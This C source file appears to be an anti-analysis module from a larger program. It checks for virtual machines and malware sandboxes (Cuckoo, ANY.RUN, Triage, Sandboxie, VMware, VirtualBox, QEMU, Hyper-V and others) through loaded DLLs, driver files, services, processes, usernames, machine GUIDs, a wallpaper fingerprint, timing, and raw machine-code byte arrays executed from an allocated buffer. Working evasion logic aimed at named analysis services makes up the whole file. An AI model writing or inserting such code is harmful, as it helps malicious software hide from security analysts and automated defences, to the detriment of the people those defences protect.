#include "antivm.h"
#include "../core/utils.h"
#include "../core/seh.h"
#include "../core/structs.h"
#include <windows.h>
#include <objbase.h>
#include <oleauto.h>
#include <wbemidl.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

BOOL avmsandboxie(void) {
    return llmodule("SbieDll.dll") != NULL;
}

BOOL avmcomodo(void) {
    return llmodule("cmdvrt32.dll") != NULL || llmodule("cmdvrt64.dll") != NULL;
}

BOOL avmqihoo(void) {
    return llmodule("SxIn.dll") != NULL;
}

BOOL avmcuckoo(void) {
    return llmodule("cuckoomon.dll") != NULL;
}

BOOL avmwine(void) {
    HMODULE k = llmodule("kernel32.dll");
    if (!k) return FALSE;
    return exportaddr(k, "wine_get_unix_file_name") != NULL;
}

typedef HRESULT (WINAPI *pcoinitex)(LPVOID, DWORD);
typedef HRESULT (WINAPI *pcocreateinstance)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);

static IWbemServices* wmiconnect(BSTR ns, BOOL* coninit) {
    *coninit = FALSE;
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) *coninit = TRUE;
    else if (hr != RPC_E_CHANGED_MODE) return NULL;
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    IWbemLocator* loc = NULL;
    if (FAILED(CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&loc)) || !loc) {
        if (*coninit) CoUninitialize();
        *coninit = FALSE;
        return NULL;
    }
    IWbemServices* svc = NULL;
    HRESULT cr = loc->lpVtbl->ConnectServer(loc, ns, NULL, NULL, NULL, 0, NULL, NULL, &svc);
    loc->lpVtbl->Release(loc);
    if (FAILED(cr) || !svc) {
        if (*coninit) CoUninitialize();
        *coninit = FALSE;
        return NULL;
    }
    CoSetProxyBlanket((IUnknown*)svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    return svc;
}

static void wmidone(IWbemServices* svc, BOOL coninit) {
    if (svc) svc->lpVtbl->Release(svc);
    if (coninit) CoUninitialize();
}

BOOL avmvmwarevbox(void) {
    BOOL coinit = FALSE;
    BSTR ns = SysAllocString(L"ROOT\\CIMV2");
    IWbemServices* svc = wmiconnect(ns, &coinit);
    SysFreeString(ns);
    if (!svc) return FALSE;
    BOOL hit = FALSE;
    BSTR lang = SysAllocString(L"WQL");
    BSTR query = SysAllocString(L"SELECT Manufacturer, Model FROM Win32_ComputerSystem");
    IEnumWbemClassObject* en = NULL;
    if (SUCCEEDED(svc->lpVtbl->ExecQuery(svc, lang, query, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en)) && en) {
        IWbemClassObject* obj = NULL;
        ULONG ret = 0;
        while (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &ret) == S_OK && obj) {
            VARIANT mv, mdv;
            VariantInit(&mv); VariantInit(&mdv);
            obj->lpVtbl->Get(obj, L"Manufacturer", 0, &mv, NULL, NULL);
            obj->lpVtbl->Get(obj, L"Model", 0, &mdv, NULL, NULL);
            char manu[256] = {0}, model[256] = {0};
            if (mv.vt == VT_BSTR && mv.bstrVal) WideCharToMultiByte(CP_ACP, 0, mv.bstrVal, -1, manu, sizeof(manu), NULL, NULL);
            if (mdv.vt == VT_BSTR && mdv.bstrVal) WideCharToMultiByte(CP_ACP, 0, mdv.bstrVal, -1, model, sizeof(model), NULL, NULL);
            for (char* p = manu; *p; p++) *p = (char)tolower((unsigned char)*p);
            char modelup[256];
            for (size_t i = 0; i < sizeof(modelup) && model[i]; i++) modelup[i] = (char)toupper((unsigned char)model[i]);
            modelup[sizeof(modelup) - 1] = 0;
            if ((strcmp(manu, "microsoft corporation") == 0 && containsi(modelup, "VIRTUAL")) || containsi(manu, "vmware")) {
                hit = TRUE;
            }
            VariantClear(&mv); VariantClear(&mdv);
            obj->lpVtbl->Release(obj);
            if (hit) break;
        }
        en->lpVtbl->Release(en);
    }
    SysFreeString(lang); SysFreeString(query);
    wmidone(svc, coinit);
    return hit;
}

static BOOL scandriverfiles(const char* const* names, int count) {
    char sysdir[MAX_PATH] = {0};
    UINT n = GetSystemDirectoryA(sysdir, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return FALSE;
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", sysdir);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    BOOL hit = FALSE;
    do {
        for (int i = 0; i < count; i++) {
            if (containsi(fd.cFileName, names[i])) { hit = TRUE; break; }
        }
        if (hit) break;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return hit;
}

BOOL avmkvm(void) {
    static const char* drivers[] = {"balloon.sys", "netkvm.sys", "vioinput", "viofs.sys", "vioser.sys"};
    return scandriverfiles(drivers, sizeof(drivers)/sizeof(drivers[0]));
}

BOOL avmqemu(void) {
    static const char* drivers[] = {"qemu-ga", "qemuwmi"};
    return scandriverfiles(drivers, sizeof(drivers)/sizeof(drivers[0]));
}

BOOL avmparallels(void) {
    static const char* drivers[] = {"prl_sf", "prl_tg", "prl_eth"};
    return scandriverfiles(drivers, sizeof(drivers)/sizeof(drivers[0]));
}

BOOL avmhyperv(void) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) return FALSE;
    DWORD bytes = 0, count = 0, resume = 0;
    EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32 | SERVICE_DRIVER, SERVICE_STATE_ALL, NULL, 0, &bytes, &count, &resume, NULL);
    if (bytes == 0) { CloseServiceHandle(scm); return FALSE; }
    BYTE* buf = (BYTE*)malloc(bytes);
    if (!buf) { CloseServiceHandle(scm); return FALSE; }
    BOOL hit = FALSE;
    if (EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32 | SERVICE_DRIVER, SERVICE_STATE_ALL, buf, bytes, &bytes, &count, &resume, NULL)) {
        ENUM_SERVICE_STATUS_PROCESSA* arr = (ENUM_SERVICE_STATUS_PROCESSA*)buf;
        static const char* svcnames[] = {"vmbus", "VMBusHID", "hyperkbd"};
        for (DWORD i = 0; i < count && !hit; i++) {
            for (size_t j = 0; j < sizeof(svcnames)/sizeof(svcnames[0]); j++) {
                if (containsi(arr[i].lpServiceName, svcnames[j])) { hit = TRUE; break; }
            }
        }
    }
    free(buf);
    CloseServiceHandle(scm);
    return hit;
}

BOOL avmblacklistednames(void) {
    static const char* bad[] = {"johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus", "john doe", "test user", "sand box", "wdagutilityaccount"};
    char user[256] = {0};
    DWORD sz = sizeof(user);
    if (!GetUserNameA(user, &sz)) return FALSE;
    for (char* p = user; *p; p++) *p = (char)tolower((unsigned char)*p);
    for (size_t i = 0; i < sizeof(bad)/sizeof(bad[0]); i++) {
        if (strcmp(user, bad[i]) == 0) return TRUE;
    }
    return FALSE;
}

BOOL avmbadfiles(void) {
    static const char* badfiles[] = {"VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmmouse.sys", "vboxogl.dll"};
    char sysdir[MAX_PATH] = {0};
    UINT n = GetSystemDirectoryA(sysdir, MAX_PATH);
    if (n > 0 && n < MAX_PATH) {
        char pattern[MAX_PATH];
        snprintf(pattern, sizeof(pattern), "%s\\*", sysdir);
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA(pattern, &fd);
        if (h != INVALID_HANDLE_VALUE) {
            BOOL hit = FALSE;
            do {
                for (size_t i = 0; i < sizeof(badfiles)/sizeof(badfiles[0]); i++) {
                    if (_stricmp(fd.cFileName, badfiles[i]) == 0) { hit = TRUE; break; }
                }
                if (hit) break;
            } while (FindNextFileA(h, &fd));
            FindClose(h);
            if (hit) return TRUE;
        }
    }
    static const char* baddirs[] = {"C:\\Program Files\\VMware", "C:\\Program Files\\oracle\\virtualbox guest additions"};
    for (size_t i = 0; i < sizeof(baddirs)/sizeof(baddirs[0]); i++) {
        DWORD a = GetFileAttributesA(baddirs[i]);
        if (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY)) return TRUE;
    }
    return FALSE;
}

BOOL avmbadprocs(void) {
    static const char* bad[] = {"vboxservice", "VGAuthService", "vmusrvc", "qemu-ga"};
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    BOOL hit = FALSE;
    if (Process32FirstW(snap, &pe)) {
        do {
            char nm[260] = {0};
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), NULL, NULL);
            char* dot = strrchr(nm, '.');
            if (dot && _stricmp(dot, ".exe") == 0) *dot = 0;
            for (size_t i = 0; i < sizeof(bad)/sizeof(bad[0]); i++) {
                if (_stricmp(nm, bad[i]) == 0) { hit = TRUE; break; }
            }
            if (hit) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return hit;
}

static BOOL readwallpaperpath(wchar_t* out, DWORD outlen) {
    HKEY key;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, KEY_READ, &key) != ERROR_SUCCESS) return FALSE;
    DWORD type = 0, sz = outlen * sizeof(wchar_t);
    LONG r = RegQueryValueExW(key, L"Wallpaper", NULL, &type, (LPBYTE)out, &sz);
    RegCloseKey(key);
    if (r != ERROR_SUCCESS) return FALSE;
    return out[0] != 0;
}

static const char b64alpha[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int b64encode(const BYTE* in, size_t inlen, char* out, size_t outlen, size_t maxchars) {
    size_t o = 0;
    size_t i = 0;
    while (i + 2 < inlen && o + 4 < outlen && o < maxchars) {
        DWORD v = ((DWORD)in[i] << 16) | ((DWORD)in[i+1] << 8) | in[i+2];
        out[o++] = b64alpha[(v >> 18) & 0x3F];
        out[o++] = b64alpha[(v >> 12) & 0x3F];
        out[o++] = b64alpha[(v >> 6) & 0x3F];
        out[o++] = b64alpha[v & 0x3F];
        i += 3;
        if (o >= maxchars) break;
    }
    if (i < inlen && o + 4 < outlen && o < maxchars) {
        DWORD v = (DWORD)in[i] << 16;
        if (i + 1 < inlen) v |= (DWORD)in[i+1] << 8;
        out[o++] = b64alpha[(v >> 18) & 0x3F];
        out[o++] = b64alpha[(v >> 12) & 0x3F];
        out[o++] = (i + 1 < inlen) ? b64alpha[(v >> 6) & 0x3F] : '=';
        out[o++] = '=';
    }
    out[o] = 0;
    return (int)o;
}

BOOL avmtriage(void) {
    wchar_t path[MAX_PATH] = {0};
    if (!readwallpaperpath(path, MAX_PATH)) return FALSE;
    wchar_t expanded[MAX_PATH] = {0};
    DWORD el = ExpandEnvironmentStringsW(path, expanded, MAX_PATH);
    const wchar_t* finalpath = (el > 0 && el <= MAX_PATH) ? expanded : path;
    HANDLE h = CreateFileW(finalpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    BYTE buf[64];
    DWORD read = 0;
    BOOL ok = ReadFile(h, buf, 48, &read, NULL);
    CloseHandle(h);
    if (!ok || read < 48) return FALSE;
    char b64[128] = {0};
    b64encode(buf, read, b64, sizeof(b64), 64);
    b64[64] = 0;
    return strcmp(b64, "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAwMDAwMDA0ODg0SExETEhsYFhYYGygd") == 0;
}

BOOL avmanyrun(void) {
    static const char* uuids[] = {
        "bb926e54-e3ca-40fd-ae90-2764341e7792",
        "90059c37-1320-41a4-b58d-2b75a9850d2f"
    };
    HKEY key;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS) return FALSE;
    char val[128] = {0};
    DWORD type = 0, sz = sizeof(val);
    LONG r = RegQueryValueExA(key, "MachineGuid", NULL, &type, (LPBYTE)val, &sz);
    RegCloseKey(key);
    if (r != ERROR_SUCCESS) return FALSE;
    for (size_t i = 0; i < sizeof(uuids)/sizeof(uuids[0]); i++) {
        if (_stricmp(val, uuids[i]) == 0) return TRUE;
    }
    return FALSE;
}

BOOL avmportconnector(void) {
    BOOL coinit = FALSE;
    BSTR ns = SysAllocString(L"ROOT\\CIMV2");
    IWbemServices* svc = wmiconnect(ns, &coinit);
    SysFreeString(ns);
    if (!svc) return FALSE;
    BSTR lang = SysAllocString(L"WQL");
    BSTR query = SysAllocString(L"SELECT * FROM Win32_PortConnector");
    IEnumWbemClassObject* en = NULL;
    BOOL anyrows = FALSE;
    if (SUCCEEDED(svc->lpVtbl->ExecQuery(svc, lang, query, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en)) && en) {
        IWbemClassObject* obj = NULL;
        ULONG ret = 0;
        if (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &ret) == S_OK && obj) {
            anyrows = TRUE;
            obj->lpVtbl->Release(obj);
        }
        en->lpVtbl->Release(en);
    }
    SysFreeString(lang); SysFreeString(query);
    wmidone(svc, coinit);
    return !anyrows;
}

BOOL avmtimingemu(void) {
    DWORD a = GetTickCount();
    Sleep(500);
    DWORD b = GetTickCount();
    return (b - a) < 500;
}

typedef int (*shellint)(void);

static BOOL runshell(const BYTE* code, SIZE_T sz, int expected) {
    PVOID p = allocshell(code, sz);
    if (!p) return FALSE;
    int r = 0;
    BOOL ok = safeexec((sehshell)(LONG_PTR)p, &r);
    BOOL match = ok && (r == expected);
    freeshell(p);
    return match;
}

BOOL avmavx(void) {
#if defined(_WIN64)
    static const BYTE code[] = {
        0x66, 0x0f, 0x5b, 0xe4, 0x75, 0x31, 0x74, 0x00, 0x66, 0x0f, 0x5b, 0xed, 0x75, 0x29, 0x74, 0x00,
        0x0f, 0x28, 0xf0, 0x66, 0x0f, 0x70, 0xf1, 0xd8, 0x0f, 0x28, 0xfe, 0x66, 0x0f, 0x5b, 0xff, 0x75,
        0x16, 0x74, 0x00, 0x0f, 0x57, 0xc0, 0x44, 0x0f, 0x28, 0xc0, 0x66, 0x45, 0x0f, 0x5b, 0xc0, 0x75,
        0x06, 0x74, 0x00, 0x48, 0x31, 0xc0, 0xc3, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0xc3
    };
#else
    static const BYTE code[] = {
        0x66, 0x0f, 0x5b, 0xe4, 0x66, 0x0f, 0x7e, 0xe0, 0x74, 0x00, 0x66, 0x0f, 0x5b, 0xed, 0x66, 0x0f,
        0x7e, 0xeb, 0x74, 0x00, 0x0f, 0x28, 0xf0, 0x66, 0x0f, 0x70, 0xf1, 0xd8, 0x0f, 0x28, 0xfe, 0x66,
        0x0f, 0x5b, 0xff, 0x66, 0x0f, 0x7e, 0xf9, 0x74, 0x00, 0x0f, 0x57, 0xc0, 0x75, 0x05, 0x74, 0x00,
        0x31, 0xc0, 0xc3, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3
    };
#endif
    return runshell(code, sizeof(code), 1);
}

BOOL avmrdrand(void) {
#if defined(_WIN64)
    static const BYTE code[] = {
        0x48, 0x0F, 0xC7, 0xF0, 0x48, 0x89, 0xC3, 0x48, 0x83, 0xFB, 0x00, 0x74, 0x0F,
        0x48, 0x0F, 0xC7, 0xF0, 0x48, 0x89, 0xC2, 0x48, 0x39, 0xDA, 0x74, 0x03,
        0xB0, 0x00, 0xC3, 0xB0, 0x01, 0xC3
    };
#else
    static const BYTE code[] = {
        0x0F, 0xC7, 0xF0, 0x89, 0xC3, 0x83, 0xFB, 0x00, 0x74, 0x0C,
        0x0F, 0xC7, 0xF0, 0x89, 0xC2, 0x39, 0xDA, 0x74, 0x03,
        0xB0, 0x00, 0xC3, 0xB0, 0x01, 0xC3
    };
#endif
    return runshell(code, sizeof(code), 1);
}

BOOL avmflagsmanip(void) {
#if defined(_WIN64)
    static const BYTE code[] = {
        0x9C, 0x58, 0x48, 0x0D, 0x00, 0x02, 0x00, 0x00, 0x50, 0x9D, 0x9C, 0x58,
        0x48, 0xA9, 0x00, 0x02, 0x00, 0x00, 0x74, 0x08,
        0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xC3,
        0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0xC3
    };
#else
    static const BYTE code[] = {
        0x9C, 0x58, 0x0D, 0x00, 0x02, 0x00, 0x00, 0x50, 0x9D, 0x9C, 0x58,
        0xA9, 0x00, 0x02, 0x00, 0x00, 0x74, 0x06,
        0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3,
        0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3
    };
#endif
    return runshell(code, sizeof(code), 1);
}
